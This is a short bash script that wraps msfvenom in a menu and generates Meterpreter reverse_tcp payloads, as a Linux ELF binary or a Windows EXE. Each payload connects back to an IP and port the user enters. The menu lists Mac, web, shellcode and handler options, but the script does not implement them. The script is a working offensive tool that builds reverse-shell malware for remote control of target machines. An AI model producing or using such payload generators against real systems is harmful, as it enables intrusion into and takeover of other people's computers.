#!/bin/bash
COWSAY=/usr/games/cowsay
function banner() {
if [ -f "$COWSAY" ] 
then
cowsay -f eyes MSFVENOM
else
echo "
╔╦╗╔═╗╔═╗  ╦  ╦┌─┐┌┐┌╔═╗┌┬┐
║║║╚═╗╠╣───╚╗╔╝├┤ │││║ ║│││
╩ ╩╚═╝╚     ╚╝ └─┘┘└┘╚═╝┴ ┴
"
echo "Github:https://github.com/fonderelite"
fi
}

function payload() {
echo "❓Options❓
Option1:Binaries[0]
==================
Option2:Windows[1]
==================
Option3:Mac[2]
==================
Option4:WebPayloads[3]
==================
Option5:Scripting-Payloads[4]
==================
Option6:ShellCodes[5]
==================
Option7:Handlers[6]
==================
"
read -p "Choice~: " choice
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
if [[ $choice -eq 0 ]];then
echo "Binary Payload
======================
"
read -p "Output file-name(file.shell)~: " output
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $output
if [ -f "$output" ] 
then
echo "Payload saved as $output" 
fi

elif [ "$choice" -eq 1 ]
then
read -p "Output file-name(file.exe)~: " output_win
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $output_win
fi
}

function main() {
banner
payload
}
main
              
